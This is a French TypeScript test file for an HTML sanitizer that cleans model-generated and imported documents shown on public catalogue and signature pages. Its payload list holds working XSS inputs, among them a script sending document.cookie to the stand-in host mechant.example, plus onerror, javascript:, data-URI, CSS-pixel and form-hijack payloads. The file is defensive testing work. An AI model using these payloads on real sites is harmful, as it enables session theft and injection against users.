// Le HTML que nous n'avons pas écrit — celui qu'un modèle produit à partir
// d'un PDF fourni par un client, ou d'une instruction — atteint des pages
// publiques : la fiche catalogue, et la page de signature ouverte au stagiaire
// par simple lien. La CSP tolère 'unsafe-inline' : elle n'arrêtera rien.
import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { nettoyerHtmlDocument, nettoyerHtmlOuNull } from '@/shared/lib/html/sanitize-document-html';

const lire = (rel: string) => fs.readFileSync(path.resolve(__dirname, rel), 'utf-8');

describe('nettoyage du HTML non fiable', () => {
  const CHARGES: [string, string][] = [
    ['script direct', '<p>Bonjour</p><script>fetch("https://mechant.example?c="+document.cookie)</script>'],
    ['gestionnaire inline', '<p onmouseover="alert(1)">Programme</p>'],
    ['image piégée', '<img src=x onerror="alert(1)">'],
    ['svg scriptable', '<svg><script>alert(1)</script></svg>'],
    ['iframe', '<iframe src="https://mechant.example"></iframe>'],
    ['lien javascript:', '<a href="javascript:alert(1)">cliquez</a>'],
    ['data-URI scriptable', '<a href="data:text/html,<script>alert(1)</script>">doc</a>'],
    ['style exfiltrant', '<style>body{background:url("https://mechant.example/pixel")}</style>'],
    ['balise object', '<object data="https://mechant.example/x.swf"></object>'],
    ['form détourné', '<form action="https://mechant.example"><input name="mdp"></form>'],
  ];

  for (const [nom, charge] of CHARGES) {
    it(`neutralise : ${nom}`, () => {
      const propre = nettoyerHtmlDocument(charge);
      expect(propre).not.toMatch(/<script/i);
      expect(propre).not.toMatch(/<iframe/i);
      expect(propre).not.toMatch(/<object/i);
      expect(propre).not.toMatch(/<form/i);
      expect(propre).not.toMatch(/on[a-z]+\s*=/i);
      expect(propre).not.toMatch(/javascript:/i);
      expect(propre).not.toMatch(/data:text\/html/i);
      expect(propre).not.toMatch(/mechant\.example/i);
    });
  }

  it('conserve la mise en forme légitime d’un programme', () => {
    const propre = nettoyerHtmlDocument(
      '<h3>Objectifs</h3><p><strong>Comprendre</strong> les <em>bases</em></p><ul><li>Un</li><li>Deux</li></ul>' +
        '<table><tbody><tr><td colspan="2">Module 1</td></tr></tbody></table>',
    );
    for (const balise of ['<h3>', '<strong>', '<em>', '<ul>', '<li>', '<table>', 'colspan="2"']) {
      expect(propre).toContain(balise);
    }
  });

  it('un lien externe légitime survit, mais sans fenêtre d’opportunité', () => {
    const propre = nettoyerHtmlDocument('<a href="https://legifrance.gouv.fr">le texte</a>');
    expect(propre).toContain('href="https://legifrance.gouv.fr"');
    expect(propre).toContain('rel="noopener noreferrer"');
  });

  it('préserve le vide plutôt que d’inventer une chaîne', () => {
    expect(nettoyerHtmlOuNull(null)).toBeNull();
    expect(nettoyerHtmlOuNull('')).toBeNull();
    expect(nettoyerHtmlDocument(null)).toBe('');
  });
});

describe('le nettoyage est branché là où le HTML non fiable circule', () => {
  it('à l’affichage du programme, page catalogue comprise', () => {
    const src = lire('../features/formations/programme/programme-document.tsx');
    expect(src).toContain('nettoyerHtmlDocument(s.html)');
  });

  it('à l’affichage du document signé par le stagiaire', () => {
    const src = lire('../app/(apprenant)/signer/document/[token]/page.tsx');
    expect(src).toContain('nettoyerHtmlDocument(doc.content_html)');
    expect(src).not.toMatch(/__html:\s*doc\.content_html\s*\}/);
  });

  it('à l’écriture, quand le modèle génère un document', () => {
    const src = lire('../features/documents/templates/generate-with-ai.ts');
    expect(src).toContain('html = nettoyerHtmlDocument(html)');
    // Avant renderTemplate : sinon le cachet et la signature de l'organisme,
    // de source sûre, seraient emportés par le nettoyage.
    expect(src.indexOf('html = nettoyerHtmlDocument(html)')).toBeLessThan(src.indexOf('renderTemplate(html'));
  });

  it('à l’écriture, quand une convention importée crée la formation', () => {
    const src = lire('../features/import/apply-convention.ts');
    expect(src).toContain('nettoyerFormationImportee');
    expect(src).toContain('const f = nettoyerFormationImportee(brute)');
  });
});
